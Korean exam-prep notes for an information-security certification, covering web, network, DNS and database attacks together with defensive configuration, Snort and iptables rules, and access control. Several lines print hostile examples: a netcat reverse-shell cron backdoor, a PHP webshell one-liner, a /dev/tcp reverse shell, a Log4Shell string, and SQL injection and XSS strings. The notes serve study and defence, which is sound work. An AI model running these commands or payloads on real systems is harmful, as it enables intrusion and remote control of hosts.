01FTP 보안

ch1-01 Q1~Q3 · 서술 Q1 · ch4 Q13

FTP는 제어와 데이터를 다른 연결로 주고받는 특이한 구조라서, 방화벽 문제와 모드 차이를 묻는다. 익명 접속·배너 노출 같은 설정 취약점도 자주 나온다.

  • 두 개의 채널: 제어 채널(명령·응답, 서버 TCP 21) + 데이터 채널(파일 전송, 서버 TCP 20)
  • 모드
    • Active(기본) — 서버가 20번 포트에서 클라이언트 쪽으로 데이터 연결을 시도 → 클라이언트 방화벽이 막으면 목록 조회 실패. 해결: 방화벽 예외 또는 Passive 사용
    • Passive — 클라이언트가 서버의 1024 이상 임의 포트로 데이터 연결을 시도
  • TFTP — UDP 기반의 단순 파일 전송. 인증 등 보안 기능 없음 / 익명 FTP — 신원 확인 없이 접근 / FTP Bounce — FTP 서버를 경유해 제3의 호스트를 스캔·공격
  • TCP Wrapper — 네트워크 서비스 접근 제어. /etc/hosts.allow를 먼저 보고, 없으면 /etc/hosts.deny 확인
  • 배너 노출 대응: Telnet은 /etc/issue.net, FTP는 /etc/vsftpd/vsftpd.conf의 ftpd_banner=, SMTP는 sendmail.cf의 GreetingMessage, 로그온은 /etc/motd
  • xinetd 서비스 끄기: /etc/xinetd.d/tftp 등에서 disable = yes

02이메일 보안: PGP · SPF · DKIM · Sendmail 릴레이

ch1-02 Q1 · 서술 Q1·Q2 · ch4 Q4·Q6 · 서술 Q7

메일은 발신자를 속이기 쉽다. 발신자 위조를 잡는 SPF·DKIM과, 내 서버가 스팸 중계지로 쓰이지 않게 하는 릴레이 제한이 핵심이다.

  • PGP — 1991년 필 짐머만 개발. 이메일에 기밀성·무결성·인증 제공. 표준 RFC 4880(OpenPGP). 메일 앱의 플러그인으로 사용
  • SPF — 메일 헤더의 발송 정보가 실제 발송 서버와 일치하는지 비교. 수신 서버가 MAIL FROM 도메인의 DNS SPF(TXT) 레코드를 조회해 발송 허용 IP인지 확인
  • DKIM — 송신 서버가 도메인 개인키로 메일에 서명하고 DNS에 공개키(TXT)를 등록. 수신 서버는 DKIM-Signature 헤더를 보고 DNS의 공개키로 검증
  • Sendmail 릴레이 제한 (내 서버를 스팸 중계기로 못 쓰게)
    • /etc/mail/sendmail.cf에서 R$* $#error $@ 5.7.1 $: "550 Relaying denied" 줄의 주석(#) 제거
    • /etc/mail/access에 호스트별 정책: RELAY(허용) / OK(조건 없이 허용) / REJECT(거부) / DISCARD(받아서 버림)
    • 변경 후 makemap hash /etc/mail/access.db < /etc/mail/access로 DB 갱신

03웹 공격의 종류

ch1-03 Q1·Q2·Q4·Q5·Q6·Q8·Q9·Q13 · 서술 Q1·Q3·Q7·Q8

웹 공격은 모두 '검증되지 않은 입력값'에서 시작한다. 각 공격이 입력값을 어디로 흘려보내는지(DB·브라우저·OS·파일·XML·서버)로 구분하면 정의가 외워진다.

  • SQL Injection — 입력값이 DB 질의문의 일부가 됨. ' or '1'='1을 넣으면 WHERE 절이 항상 참 → 비밀번호 없이 로그인, 모든 데이터 조회. 로그 단서: password=' or id='admin';--
  • XSS — 입력값이 다른 사용자의 브라우저에서 스크립트로 실행. 쿠키·세션 탈취, 악성 사이트로 리다이렉트
    • 저장형 — 게시판 등 DB에 스크립트를 저장해 두고 보는 사람마다 실행 / 반사형 — 악성 URL을 클릭하면 서버 응답에 스크립트가 실려 실행
    • 점검: <script>alert(document.cookie)</script> 입력 후 경고창이 뜨는지
  • CSRF — 사용자가 자신도 모르게 공격자가 의도한 요청을 특정 사이트에 보내게 함 (로그인된 세션을 이용)
  • 운영체제 명령어 삽입 — 입력값이 OS 명령으로 실행 / 파일 삽입(LFI/RFI) — PHP의 include, require로 악성 스크립트를 읽어 실행. 대응: php.ini에서 allow_url_fopen = Off
  • 파일 업로드 — 서버 스크립트 파일(웹쉘)을 올리고 실행 → 서버 장악. 웹 쉘 = PHP·ASP·JSP 등으로 작성된 원격 제어 스크립트
  • XXE 인젝션 — XML에 외부 엔티티 선언을 넣어 서버가 파싱하면서 내부 파일 읽기·서버 동작 유도
  • SSRF — 서버 간 요청에 외부 입력을 허용해, 웹 서버가 공격자가 지정한 내부망·메타데이터 서버로 요청을 보내게 함
  • 딥링크 — 앱의 특정 화면으로 바로 가는 링크. 악용되면 앱 안의 민감 정보 노출
  • OWASP Top 10에 늘 들어가는 세 가지: Injection, XSS, CSRF

04웹 공격 대응 설정

ch1-03 Q10·Q11·Q12 · 서술 Q2·Q5·Q6 · ch4 Q2·Q3·Q5·Q7 · 서술 Q2·Q3·Q4·Q5·Q6·Q8·Q9·Q11

ch4 취약점 점검은 대부분 '설정을 어떻게 고치느냐'다. Apache 지시자, 쿠키 속성, 파일 업로드 차단, Prepared Statement 코드를 그대로 쓸 수 있어야 한다.

  • SQL Injection 대응
    • Prepared Statement — 쿼리를 먼저 컴파일해 두고 입력값은 매개변수로만 처리 → 입력값이 SQL 코드가 되지 못함. 자바: "... WHERE b_gubun = ?" → con.prepareStatement(sql) → pstmt.setString(1, gubun) → pstmt.executeQuery()
    • 그 밖에: 최소 권한으로 DB 구동, 동적 SQL 금지, 특수문자(' " / \ ; : 공백 -- +) 검증, 에러 메시지 숨김, 화이트리스트, 스키마 정보 숨김
  • 디렉터리 리스팅(인덱싱) — 파일 목록이 그대로 보임. 응답이 200 OK + "Index of"면 공격 성공. 대응: httpd.conf의 Options에서 Indexes 제거(또는 -Indexes)
  • 상위 디렉터리 접근 금지 — AllowOverride None이면 .htaccess가 안 먹음 → AllowOverride AuthConfig로 바꾸고 .htaccess에 AuthName/AuthType Basic/AuthUserFile/Require valid-user, htpasswd -c로 계정 생성, Apache 재시작
  • 파일 업로드 대응
    • 점검: 서버 스크립트 파일 업로드 가능 여부, 업로드된 파일 실행 가능 여부
    • 조치: 확장자 필터링(화이트리스트), 파일명·확장자 변경, 전용 디렉터리에 저장하고 실행 제한, 특수문자 필터링
    • .htaccess: <FilesMatch "\.(ph|inc|lib)">로 직접 호출 차단, AddType text/html .php로 실행 대신 텍스트로 처리
    • 우회 기법: Content-Type 변조, 확장자 바꾸기(webshell.jpg), Null 바이트(webshell.php%00.jpg). 클라이언트 측 검사만 믿으면 뚫림
  • 쿠키 속성 (Set-Cookie: id=x; Secure; HttpOnly)
    • Secure — HTTPS로만 전송 → 스니핑·중간자 방지 / HttpOnly — 자바스크립트(document.cookie)로 접근 불가 → XSS 쿠키 탈취 방지 / Expires — 짧은 만료로 탈취돼도 빨리 무효화
  • Apache 설정 항목: Timeout(응답 없으면 끊는 대기 시간) / MaxKeepAliveRequests(Keep-Alive 최대 수) / DirectoryIndex(기본 문서 순서) / ErrorLog, CustomLog(로그 경로, httpd.conf에서 지정) / 로그는 Access Log(정상 접속)와 Error Log
  • robots.txt — 사이트 루트에 두어 크롤러에게 수집 금지 경로를 지시. Disallow: /admin/, Disallow: /*.pdf$
  • 웹 프록시 도구(Burp Suite, OWASP ZAP, Paros) — 요청을 가로채 변조하며 취약점 점검
  • cron 백도어 예: 0 0 12 * * root /usr/bin/nc 1.1.1.1 80 -e /bin/sh = 매월 12일 0시에 root로 공격자에게 접속해 쉘을 넘김(리버스 쉘)

05DNS 보안

ch1-04 Q1~Q7 · 서술 Q1 · ch4 Q1 · 서술 Q1

DNS는 인터넷의 전화번호부다. 구조(존·레코드·서버 종류)를 알아야 스푸핑·증폭·존 전송 같은 공격과 설정 문제를 이해할 수 있다.

  • 기본: 도메인 이름 ↔ IP 변환. 보통 UDP 53, 응답이 512바이트를 넘거나 존 전송 등 특수한 경우 TCP 53. 조회 결과는 TTL만큼 캐시
  • 존 파일 — 도메인의 DNS 레코드를 저장하는 DB / 자원 레코드(RR) — 이름과 값의 매핑 / hosts 파일 — DNS보다 먼저 참조하는 수동 매핑 파일
  • 네임 서버 종류: 루트 → TLD(.com 등) → Authoritative(책임, 실제 레코드 보유) / Cache(리졸버, 결과를 캐시)
  • DNS 스푸핑 — 응답을 조작하거나 캐시를 오염시켜 가짜 사이트로 유도. 중간자가 질의를 보고 진짜보다 먼저 가짜 응답
  • DNS 증폭 공격 — 출발지를 피해자로 위조하고 ANY 질의(응답이 큼)를 오픈 DNS에 보내 피해자에게 큰 응답이 몰리게 함. DNS는 인증이 없어 가능
  • 서브 도메인 하이재킹 — 쓰지 않는 CNAME(클라우드 서비스)을 지우지 않아 공격자가 그 서비스를 재등록해 서브 도메인을 차지
  • 존 전송(Zone Transfer) 제한 — dig @서버 도메인 axfr로 전체 존 데이터가 나오면 취약. /etc/named.conf의 allow-transfer { 192.168.0.1; };로 보조 서버에만 허용

06데이터베이스 보안

ch1-05 Q1~Q3 · 서술 Q1 · ch4 Q8 · 서술 Q10·Q12

DB는 가장 가치 있는 자산이 모인 곳이다. 통제 기법, 간접 유출 공격, 암호화 방식, 계정·권한·감사 설정이 나온다.

  • 통제 기법: 접근 통제(권한 관리) / 추론 통제(간접 유추 방지: 질의 제한, 응답 한정) / 흐름 통제(높은 등급 → 낮은 등급으로 흐르지 않게)
  • 공격 유형: 집합성(Aggregation) — 낮은 등급 정보 조각을 모아 높은 등급 정보를 알아냄 / 추론(Inference) — 비밀이 아닌 정보로 기밀을 유추 / 데이터 디들링 — 입력·처리 중 데이터를 몰래 변조
  • 컬럼 암호화 방식: API(앱 서버에 라이브러리, 앱이 호출) / Plug-in(DB 서버에 설치, DBMS가 호출) / Hybrid / TDE(DBMS가 투명하게 암·복호화, 앱 수정 불필요)
  • 데이터 마스킹: 정적 — 저장·공유 전에 영구 변환(운영 DB → 개발 DB) / 동적 — 조회 시 SQL을 바꿔 화면에만 가림(실제 데이터는 그대로)
  • 계정·권한: DBA 외에는 CREATE · ALTER · DROP 권한 금지. 기본 계정 비밀번호 변경, 불필요 계정 제거·잠금, 비밀번호 기간·복잡도, 관리자 권한 최소화, 원격 접속 제한, 리스너 비밀번호, Public Role 금지
  • MySQL 외부 접속: my.cnf의 bind-address = 127.0.0.1(로컬만) → 0.0.0.0 또는 주석 처리
  • Oracle 감사: AUDIT_TRAIL = NONE(끔) / DB(SYS.AUD$에 저장) / OS. 설정: ALTER SYSTEM SET AUDIT_TRAIL=DB SCOPE=SPFILE;(재시작 필요). 감사 로그는 외부 시스템에 실시간 전송해야 변조 불가·연속성·DBA 추적 가능

07취약점 체계와 대표 취약점

ch2-01 Q1~Q6 · 서술 Q1

취약점은 번호(CVE)와 점수(CVSS)로 관리된다. 이름만 들으면 '무엇이 왜 뚫리는지' 설명할 수 있어야 하는 유명 취약점이 몇 개 있다.

  • CVE — MITRE가 운영하는 취약점 고유번호. CVE-YYYY-NNNN(연도-번호) / CVSS — 심각도 점수 0~10(10이 최악). 기본·시간·환경 메트릭
  • HeartBleed — OpenSSL Heartbeat 확장이 요청 길이를 검증하지 않아 메모리 64KB씩 유출. 취약 버전 1.0.1~1.0.1f, 1.0.2-beta. 대응: 1.0.1g 이상 업데이트, Heartbeat 비활성화, 인증서 재발급, 비밀번호 재설정
  • POODLE — TLS 연결을 SSL 3.0으로 다운그레이드시킨 뒤 CBC 패딩 오라클로 복호화. 대응: SSL 3.0 비활성화
  • Log4Shell(Log4j, CVE-2021-44228) — 로그에 기록되는 값에 ${jndi:ldap://...}를 넣으면 JNDI·LDAP로 원격 코드 실행(RCE)

08개발 보안

ch2-02 Q1~Q3 · 서술 Q1·Q2

보안은 만들 때부터 넣어야 싸다. 테스트 방법 구분, 소스코드 보안 약점 7유형, 분석 단계 산출물을 묻는다.

  • 테스트 방식: 블랙박스(소스 모르고 외부 인터페이스로) / 화이트박스(소스를 보며) / 그레이박스(일부 내부 정보)
  • 소스코드 보안 약점 7유형: ① 입력 데이터 검증 및 표현(SQL 삽입·XSS·명령어 삽입 등) ② 보안 기능(인증·접근제어·암호화 부적절) ③ 시간 및 상태(멀티스레드, 레이스 컨디션) ④ 에러 처리(에러 메시지 정보 노출) ⑤ 코드 오류(형 변환, 버퍼 오버플로우) ⑥ 캡슐화(중요 데이터 노출) ⑦ API 오용
  • 불안전한 암호화 저장 점검: 중요 정보가 SQL Query로 열람 불가한가, 세션 ID·쿠키가 랜덤한가, 적절한 암호화 알고리즘인가
  • XML 조회 검증: 공통 검증 컴포넌트로 필터링, 미리 작성된 질의문에 바인딩, 안전한 API 사용
  • CBD 분석 단계 산출물: 요구사항 정의서 · 요구사항 추적표 · 유즈케이스 명세서 · 유즈케이스 다이어그램

09시스템 공격 기법

ch3-01 Q1~Q11 · 서술 Q1

메모리 구조를 알아야 버퍼 오버플로우와 그 방어(카나리·ASLR)가 이해된다. 나머지는 공격 이름과 정의를 짝짓는 문제다.

  • 메모리 영역: 스택(지역 변수·매개변수·복귀 주소, 함수 끝나면 소멸) / 힙(malloc·new로 동적 할당)
  • 버퍼 오버플로우 — 버퍼 크기를 넘는 입력으로 복귀 주소를 덮어 실행 흐름을 바꿈. 원인 함수: strcpy(길이 검사 없음) → strncpy 등으로 교체
    • 카나리(Canary) — 복귀 주소와 변수 사이에 검사용 값을 넣고, 변했으면 복귀하지 않음
    • ASLR — 메모리 시작 주소를 실행 때마다 무작위로 배치해 주소 예측 불가

01Snort 룰의 구조

ch1-01 Q1·Q2·Q4·Q6 · 서술 Q4·Q5·Q7·Q8 · ch2-02 서술 Q1·Q7·Q12

Snort는 오픈소스 IDS/IPS로, 4과목에서 가장 많이 나온다. 룰 한 줄을 읽고 뜻을 설명하거나 빈칸을 채우는 문제이므로 헤더와 옵션의 의미를 정확히 알아야 한다.

  • 룰 = 헤더 + (옵션)
    • 헤더: action 프로토콜 출발지IP 출발지포트 -> 목적지IP 목적지포트 예) alert tcp any any -> any 80 = 모든 곳에서 80포트로 가는 TCP를 검사해 경고. <>는 양방향
    • 포트는 서비스로 정한다: HTTP 80, Telnet 23, FTP 21, HTTPS 443
  • action(탐지 시 처리)
    • alert 경고+로그 / log 로그만 / pass 무시 / drop 차단+로그 / reject 차단+로그+응답(TCP RST, UDP ICMP Unreachable) / sdrop 차단만, 로그 없음
    • "차단하고 로그를 남기는" 두 가지 = drop, reject
  • 자주 나오는 옵션
    • msg — 탐지 시 출력할 메시지. 탐지에는 영향 없음
    • content — 페이로드에서 찾을 문자열. 기본은 대소문자 구분. content:!"x"는 x가 없어야 매칭. |00|처럼 파이프 안은 16진수 바이너리
    • nocase — 대소문자 구분 없이 (예: /Login.php를 /login.php 룰로 잡으려면 필요)
    • offset — 검색 시작 위치 / depth — 검색 범위 길이. 처음부터 N바이트만 보려면 offset 생략(=0), depth:N
    • distance — 직전 매칭 지점에서 N바이트 떨어진 곳부터 / within — 직전 매칭 후 N바이트 안에서
    • pcre — 정규표현식. 유연하지만 부하가 커서 any any에 걸면 장비 성능 저하 → 목적지 IP·포트를 좁혀야 함
    • sid — 룰 고유 번호
  • threshold — 이벤트 횟수 제한. threshold:type <limit|threshold|both>, track <by_src|by_dst>, count N, seconds S
    • limit — S초 동안 최대 N번까지만 경고 / threshold — S초 동안 N번 이상이면 경고(조건 충족마다 반복) / both — N번 이상이면 S초에 딱 1번만 경고
    • 예) type threshold, track by_src, count 10, seconds 1 = 같은 출발지에서 1초에 10번 이상이면 경고 (GET Flooding 탐지)
  • 룰 작성 예: 텔넷(23)으로 가는 패킷의 첫 14바이트 안에 anonymous가 있으면 "Dangerous" → alert tcp any any -> any 23 (msg:"Dangerous"; content:"anonymous"; offset:0; depth:14;)

02Snort 룰로 탐지하는 대표 공격

ch1-01 서술 Q5·Q7·Q8 · ch2-02 서술 Q1·Q7·Q12

룰 문제는 결국 '이 룰이 어떤 공격을 잡는가'로 이어진다. 공격별로 룰에 들어가는 특징 문자열을 알아 두면 역으로 해석할 수 있다.

  • HTTP GET Flooding — 같은 출발지에서 GET / HTTP/1. 요청을 초당 수십 번 → threshold(track by_src, count 10, seconds 1)로 탐지
  • XSS — URL에 %3Cscript%3E(= <script>) 포함. 경로 대소문자(Login.php)를 바꿔 우회하므로 nocase 필요
  • 익명 FTP 접속 — 21포트로 USER anonymous. "AnOnYmOuS"처럼 섞어 써도 nocase면 탐지. 꼭 필요한 경우가 아니면 anonymous FTP는 disable
  • HeartBleed — TLS 포트(443, 465, 523)에서 |18 03 00|(Heartbeat, TLS1.0) + |01|(Request) 뒤에 길이 바이트 검사(content:!"|00|")
  • GET Flooding 룰 해석 예: content:"USER"; content:!"anonymous" = USER는 있고 anonymous는 없는 패킷 / content:"|00|"; depth:1 = 첫 바이트가 NULL

04iptables 방화벽

ch1-01 서술 Q2·Q3·Q6·Q9·Q10

리눅스 방화벽 명령을 읽고 뜻을 설명하거나 옵션을 채우는 문제다. 체인·매치·타깃의 세 부분을 알면 어떤 명령이든 읽힌다.

  • 기본 체인(Chain) 3가지: INPUT(들어오는 패킷) / FORWARD(경유하는 패킷) / OUTPUT(나가는 패킷). 대문자로 써야 함
  • 구조: iptables -A 체인 [매치 조건] -j 타깃
    • 조건: -p tcp(프로토콜) --dport 80(목적지 포트) --sport 123(출발지 포트) --syn(SYN만 켜진 패킷) ! --syn(SYN이 아닌)
    • 모듈: -m limit --limit 10/s(초당 10개까지 허용) / -m recent --update --seconds 2 --hitcount 30 --name 이름(같은 IP가 2초에 30번 이상) / -m state --state NEW(새 연결) / -m length --length 100:(100바이트 이상)
  • 타깃(-j)
    • ACCEPT 허용 / DROP 응답 없이 버림 / REJECT 버리고 ICMP 에러 또는 TCP RST 응답 / LOG syslog(/var/log/messages)에 기록, --log-prefix "[문구]"
    • 보안상 DROP이 낫다: REJECT의 응답 메시지가 공격자에게 정보가 되고 DDoS에 악용될 수 있음
  • 예시 풀이
    • SYN Flooding 방어: -A INPUT -p tcp --syn --dport 80 -m limit --limit 10/s -j DROP (초당 10개 초과 차단)
    • NTP 증폭 방어: -A OUTPUT -p udp --sport 123 -m length --length 100: -j DROP (NTP 응답 중 100바이트 이상 차단)
    • 비정상 연결 로그: -p tcp ! --syn -m state --state NEW -j LOG (새 연결인데 SYN이 아니면 기록)

06캡처·로그로 공격 판단하기 ① DoS 계열

ch1-01 서술 Q2·Q6 · ch2-02 Q1 · 서술 Q3·Q5·Q9·Q11

화면에서 '이상한 패턴'을 찾아 공격 이름을 쓰고 원리·대응을 설명하는 문제다. 공격마다 눈에 띄는 단서가 정해져 있다.

  • TCP SYN Flooding — 단서: 여러 출발지에서 같은 포트로 SYN만 반복, netstat에 SYN-RECEIVED 다수. 백로그 큐가 차서 새 연결 거부. 대응: iptables limit, SYN 쿠키
  • Smurf — 단서: ICMP Echo Request가 브로드캐스트 주소(x.x.x.255)로 반복. 출발지를 피해자 IP로 위조해 보내면 네트워크의 모든 호스트가 피해자에게 응답. 대응: 라우터에서 Directed Broadcast 차단, 호스트가 브로드캐스트 ICMP에 응답하지 않게 설정, IPS에서 다량 Echo Reply 차단
  • Slowloris(Slow HTTP Header DoS) — 단서: HTTP 헤더 끝 \r\n\r\n(0D0A0D0A) 대신 \r\n만 보내 헤더를 끝내지 않음. 연결을 오래 붙잡아 세션 고갈. 대응: Session Timeout 설정, 개행이 한 번만 있는 패킷 시그니처 차단
  • RUDY(Slow HTTP POST DoS) — 단서: Content-Length를 매우 크게(예: 100000000) 보내 놓고 본문을 몇 바이트씩 천천히 전송. 대응: Content-Length 임계치, Session Timeout
  • DNS 증폭 — 단서: 같은 도메인에 ANY 타입 질의 반복. 작은 질의로 큰 응답을 만들고(증폭), 출발지를 피해자로 위조. 가능한 이유: ANY의 증폭 효과 + DNS는 인증이 없는 오픈 서버
  • NTP monlist 증폭 — 출발지를 피해자로 위조한 monlist 요청을 여러 NTP 서버에 보내 큰 응답이 몰리게 함. 대응: NTP 서버가 100바이트 이상 응답을 내보내지 않도록 iptables로 차단

07캡처·로그로 공격 판단하기 ② 웹·시스템 공격

ch2-02 Q2·Q3 · 서술 Q2·Q4·Q6·Q10·Q13

웹 로그 한 줄이나 명령어를 보고 공격 이름을 쓰는 문제다. URL 인코딩을 풀어 읽는 연습이 필요하다. (%27=', %20=공백, %3D==, %3C=<, %3E=>, %2C=,)

  • SQL Injection — 단서: id=1' or '1'='1'#, pw='1' or 1=1처럼 따옴표와 or 조건으로 로그인 검증식을 참으로 만듦. 대응: Prepared Statement(매개변수 바인딩), 특수문자 입력 검증, 에러 메시지 숨김, 화이트리스트, 최소 권한, 스키마 정보 유출 방지
  • Blind SQL Injection — 단서: substr(password,2,1)='0'처럼 한 글자씩 조건을 바꿔 가며 반복 요청. 응답 크기(200 3926 vs 1739)나 내용 출력 여부(True/False)로 참·거짓을 판단해 DB명·비밀번호를 한 글자씩 알아냄 (Boolean-based). 클라이언트 측(자바스크립트) 검증은 프록시(Burp Suite)로 우회되므로 서버 측 검증이 필요
  • 쉘쇼크(Shellshock) — Bash가 환경변수의 함수 선언 () { :; }; 뒤에 붙은 명령을 검증 없이 실행하는 취약점(CVSS 10점). 웹쉘 파일 생성(echo "<?php system($_GET[cmd]); ?>" > shell.php)이나 리버스 쉘(/bin/bash -i >& /dev/tcp/공격자IP/80 0>&1) 연결에 악용
  • IIS 유니코드 취약점 — 단서: ..%c1%1c../winnt/system32/cmd.exe. %c1%1c가 /로 해석돼 상위 디렉터리로 이동(디렉터리 트래버설). 상태 코드 404면 실패, 200이면 성공. 대응: IIS 패치, 웹 루트를 OS 드라이브(C:)와 다른 드라이브에, 인코딩 패턴 필터링
  • HeartBleed 점검 — openssl version이 1.0.1~1.0.1f면 취약. openssl s_client -tlsextdebug로 heartbeat 확장 확인. 대응: 시스템적=OpenSSL 1.0.1g 이상으로 업데이트, 소스(ssl/d1_both.c) 확인 / 서비스적=불필요한 Heartbeat 제거, 인증서 재발급, 비밀번호 재설정

08악성코드·시스템 분석

ch2-01 서술 Q1·Q2·Q4 · ch2-02 서술 Q8

침해사고가 나면 악성코드가 '무엇을 했는지'와 '어떻게 분석하는지'를 묻는다. 분석 방법 세 가지와 레지스트리·/proc를 읽는 법이 핵심이다.

  • Drive By Download — 해킹된 웹사이트의 iframe·자바스크립트·리다이렉션으로 사용자를 여러 경유지를 거쳐 최종 유포 사이트로 보내고, 거기서 PC 취약점으로 악성코드 감염. 실제 감염되는 곳 = 최종 유포 사이트
  • 악성 파일(PE) 분석 방법 3가지
    • 정적 분석 — 실행하지 않고 바이너리 구조·코드를 분석
    • 동적 분석 — 실제로 실행해 전후 상태를 비교
    • 자동화 분석 — 도구로 정적+동적을 결합해 전체 흐름 파악
  • 윈도우 변경 사항 읽기 (SysAnalyzer 스냅샷)
    • CreateFileA → 파일 생성 / ...\Run\x.exe → 부팅 시 자동 실행 / ...\Services\x.exe → 서비스 등록 / FirewallPolicy...\OpenPorts\9070:TCP → 방화벽에 포트 허용(백도어 의심) / Hidden\SHOWALL\0 → 숨김 파일 안 보이게 / batfile\shell\runas\command → .bat 실행 명령 조작 / Directory\Shell\CommandPrompt\command → 우클릭 명령 프롬프트를 악성 파일로 바꿈
  • 삭제된 백도어 분석 (/proc/PID)
    • 파일이 없는 이유: 실행 후 파일을 삭제해도 프로세스는 메모리에 남음

01Diffie-Hellman 키 교환

ch1-01 Q1

암호화 통신을 하려면 양쪽이 같은 비밀키를 가져야 하는데, 키를 그냥 보내면 중간에서 가로챈다. DH는 키를 보내지 않고도 같은 키를 만들어 내는 방법이다. 식의 빈칸을 채우는 문제로 나온다.

  • 준비: Alice가 소수 p와 p보다 작은 원시근 g를 고른다 (공개해도 됨)
  • 각자 개인키를 정하고 공개키를 계산해 서로 보낸다
    • Alice: 개인키 a → 공개키 A = ga mod p
    • Bob: 개인키 b → 공개키 B = gb mod p
  • 받은 공개키에 자기 개인키를 지수로 올리면 둘 다 같은 값이 나온다 → 공유키 gab mod p
    • Alice: Ba = (gb)a = gab / Bob: Ab = (ga)b = gab
  • 중간에서 g, p, A, B를 다 봐도 a, b를 모르면 공유키를 못 만든다 (이산대수 문제의 어려움)

02Pass-the-Hash 공격

ch1-02 Q1

  • Pass-the-Hash — Mimikatz 같은 도구로 메모리에서 NTLM / LanMan 해시를 빼낸 뒤, 그 해시값을 그대로 보내 원격 서버·서비스 인증을 통과하는 기법
  • 왜 되는가: NTLM 인증은 비밀번호 원문이 아니라 해시값으로 응답을 만들기 때문에, 해시만 있으면 비밀번호를 아는 것과 같다
  • 대응
    • 패스워드 해시값을 외부로 노출하지 않음
    • NTLM 대신 Kerberos 프로토콜 사용

03EAM과 IAM

ch2-01 서술 Q1

회사에는 시스템마다 계정과 권한이 흩어져 있다. 이를 한곳에서 관리하는 솔루션이 EAM과 IAM이며, 둘의 공통점·차이·장단점을 묻는다.

  • 공통 기능: 통합인증(SSO), 권한 부여, 자원 관리, 보안 정책
  • EAM(Extranet Access Management)
    • 관리 대상: 업무 시스템(Windows·Linux 서버, DB 등)과 애플리케이션 계정의 권한
    • 장점: 자산 권한 관리, 유지보수 비용 절감, 시스템 권한의 중앙 통제
    • 단점: 관리자가 직접 권한을 관리해 관리 비용 증가, 계정을 수동 생성해 운영 비용 증가, 관리 어려움
    • 솔루션: Oracle EAM, IBM Maximo
  • IAM(Identity and Access Management)
    • 관리 대상: 실시간 사용자 계정
    • 장점(EAM 대비 개선): 조직 전체 사용자 계정 자동 관리·생성, 정책에 따른 권한 부여·회수 자동화
    • 단점: 초기 설정 복잡, 다양한 권한 모델 설계 난이도, 타 시스템 연동 비용
    • 솔루션: Okta, Azure AD

04접근통제 정책: MAC · DAC · RBAC

ch2-02 Q1·Q2

'누가 무엇에 접근할 수 있는가'를 정하는 세 가지 방식이다. 권한을 누가 주는지, 무엇을 기준으로 판단하는지가 구분 포인트다.

  • 강제적 접근통제(MAC) — 주체와 객체의 보안 등급(Security Label)을 비교해 접근 허용. 관리자만 분류를 정하고 바꿈. 권한 부여자: 시스템
  • 임의적 접근통제(DAC) — 주체의 신분(Identity, ID)에 근거해 접근 제한. 보통 ACL 사용. 권한 부여자: 데이터 소유자
  • 역할 기반 접근통제(RBAC) — 주체의 역할(Role)에 따라 접근 제한. MAC과 DAC의 단점을 보완. 권한 부여자: 중앙 관리자
  • 한 줄 구분: MAC=등급, DAC=신원, RBAC=역할

05접근통제 보안 모델: 벨-라파듈라 · 비바

ch2-02 서술 Q1

등급이 다른 사용자와 문서 사이에서 읽기·쓰기를 어떻게 막아야 기밀성 또는 무결성이 지켜지는지를 규칙으로 만든 모델이다. 두 모델의 규칙이 서로 반대라서 헷갈리기 쉽다.

  • 벨-라파듈라(BLP) — 미 국방성 지원, 기밀성 강조
    • No Read Up — 낮은 등급 주체는 높은 등급 객체를 읽을 수 없음 (상위 문서 읽기 금지, 하위 읽기 허용)
    • No Write Down — 높은 등급 주체는 낮은 등급 객체에 쓸 수 없음 (하위 문서 쓰기 금지, 상위 쓰기 허용) → 비밀이 아래로 새는 것을 막음
  • 비바(Biba) — BLP의 단점을 보완한 무결성 보장 모델, 최초의 상업용 모델
    • No Read Down — 높은 등급 주체는 낮은 등급 객체를 읽을 수 없음 (하위 문서 읽기 금지)
    • No Write Up — 낮은 등급 주체는 높은 등급 객체를 수정할 수 없음 (상위 문서 쓰기 금지) → 믿을 수 없는 정보가 위로 섞이는 것을 막음
  • 기억법: BLP는 '위로 못 읽고 아래로 못 쓴다', Biba는 정확히 반대

06인증서 고정(Certificate Pinning)

ch2-03 Q1

앱이 서버와 HTTPS로 통신할 때, 공격자가 가짜 인증서로 끼어들면(중간자 공격) 암호화가 무력해진다. 앱에 '진짜 서버 인증서'를 미리 박아 두는 것이 인증서 고정이다.

  • 개념 — 클라이언트(모바일 앱)가 사전에 정해 둔 특정 인증서 또는 공개키만 유효한 것으로 인정하도록 강제하는 기법
  • 막는 공격 — 중간자(MITM) 공격, 잘못된 인증서 체인 사용
  • 구성 요소 3가지
    • 고정할 인증서(공개키) — 앱에 하드코딩하거나 리소스로 포함
    • 인증서 관리 — 보관·갱신·검증. 키 교체 방안, TLS 핸드셰이크 때 일치 여부 검증
    • 오동작 및 로그 관리 — 불일치 시 차단·알람 처리 로직, 이벤트 로그
  • 우회 방법
    • Frida 등 후킹 도구로 HostNameVerifier 같은 검증 함수를 후킹해 우회
    • 앱 수정 — 디컴파일 후 검증 로직을 고쳐 재배포
    • 기기에 신뢰할 수 있는 중간 CA를 설치해 MITM

07쉘 코드와 어셈블리 기초

ch3-01 Q1·Q5·Q6

익스플로잇·리버싱 문제는 어셈블리 명령어의 기계어 값, 함수 인자가 들어가는 레지스터, 동적 링킹 구조를 묻는다. 암기 항목이지만 '왜 그런지'를 알면 덜 헷갈린다.

  • 쉘 코드(Shell Code) — 시스템의 특정 명령을 실행하기 위한 작은 기계어 프로그램. 리버스 엔지니어링은 실행 파일·쉘 코드의 동작을 분석하는 기술
  • 주요 명령어와 기계어
    • NOP = 0x90 — 아무 일도 안 함. 쉘 코드 앞에 깔아 실행 흐름을 유도(NOP 썰매)
    • RET = 0xC3 — 스택에 저장된 복귀 주소로 돌아감. RET EIP ESP: ESP(스택 포인터)의 값을 EIP(명령 포인터)로 옮김
    • JMP = 0xEB — 해당 주소로 점프 / CALL = 0xE8 — 함수 호출, 복귀 주소 저장
  • 64비트 리눅스 함수 인자 레지스터 순서: 1번째 RDI → 2번째 RSI → 3번째 RDX → 4번째 RCX
    • printf("%c %c %c", 'A','B','C') → 형식 문자열=RDI, 'A'=RSI, 'B'=RDX, 'C'=RCX
  • 동적 링킹 — 실행할 때 외부 라이브러리를 연결. 라이브러리가 프로그램 밖에 있어 함수 주소를 알아오는 과정이 필요
    • PLT(Procedure Linkage Table) — 외부 함수를 호출하는 창구. 외부 함수 호출은 PLT를 거침
    • GOT(Global Offset Table) — 외부 함수의 실제 주소를 저장. PLT가 GOT를 참고해 실제 주소로 감

08클라우드 서비스 모델

ch3-01 Q2

클라우드는 '어디까지 빌려 쓰는가'에 따라 세 층으로 나뉜다. 설명을 보고 유형을 고르는 문제다.

09보안 솔루션: EDR · DLP · BYOD 보안

